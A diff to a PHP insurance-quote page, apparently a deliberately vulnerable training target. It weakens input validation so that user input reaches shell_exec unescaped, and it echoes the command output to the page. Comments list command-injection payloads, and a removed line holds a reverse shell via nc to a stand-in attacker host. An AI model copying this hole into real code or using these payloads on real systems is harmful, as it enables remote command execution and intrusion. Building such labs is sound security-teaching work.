@@ -22,9 +22,9 @@ function validate_policy_reference($policy_ref) {
         return $validation_cache[$cache_key];
     }
     
-    // Basic format validation (this can be bypassed)
-    // The regex allows alphanumerics, hyphens, and spaces - but spaces aren't shown in the pattern!
-    if (preg_match('/^[A-Za-z0-9\-\s]{3,50}$/', $policy_ref)) {
+    // Length validation only - appears to be a security check but isn't strict enough
+    // The developer thought checking length would be sufficient
+    if (strlen($policy_ref) >= 3 && strlen($policy_ref) <= 200) {
         $validation_cache[$cache_key] = true;
         return true;
     }
@@ -103,22 +103,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $policy_file = "/dev/null"; // Fallback - normally would be /var/lib/inception/policies.dat
         
         // The command construction is vulnerable because $policy_reference is not properly escaped
-        // with escapeshellarg() - only checked with regex which can be bypassed
-        $cmd = "grep -l " . $policy_reference . " " . $policy_file . " 2>/dev/null | wc -l";
+        // with escapeshellarg() - only checked with length which doesn't prevent injection
+        $cmd = "grep -l " . $policy_reference . " " . $policy_file . " 2>&1";
         
         // Attempting to execute the command to verify policy exists
-        // This is wrapped in a try-catch to handle errors gracefully
-        try {
-            $policy_check_result = @shell_exec($cmd);
-        } catch (Exception $e) {
-            $policy_check_result = "0";
-        }
+        // Output is now displayed for debugging purposes
+        $policy_check_result = shell_exec($cmd);
         
         // Example vulnerable payloads:
-        // 1. INC-2024; id; echo (shell command injection)
-        // 2. INC-$(whoami)-2024 (command substitution)
-        // 3. INC-2024`whoami` (backtick substitution)
-        // 4. INC-2024 | nc attacker.com 4444 -e /bin/bash (pipe to commands)
+        // 1. ; whoami #
+        // 2. ; id #
+        // 3. ; ls -la /tmp #
+        // 4. $(whoami)
+        // 5. `id`
     }
     
     // Generate quote details
@@ -137,6 +134,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     echo "<tr class='highlight'><td><strong>Annual Premium:</strong></td><td>\$" . number_format($quote['annual'], 2) . "</td></tr>";
     echo "</table>";
     echo "<p style='margin-top: 15px; font-size: 0.9em;'>Quote valid for 30 days. Please contact our sales team to proceed.</p>";
+    
+    // Debug info - shows command injection output
+    if (!empty($policy_reference) && $policy_check_result) {
+        echo "<hr style='margin: 15px 0;'>";
+        echo "<div style='background: #f5f5f5; padding: 10px; border-radius: 5px; font-family: monospace; font-size: 0.85em; white-space: pre-wrap; word-break: break-all;'>";
+        echo "<strong>Policy Verification Output:</strong><br>";
+        echo htmlspecialchars($policy_check_result);
+        echo "</div>";
+    }
+    
     echo "</div>";
 } else {
     echo "<div class='error'>❌ Invalid request method.</div>";
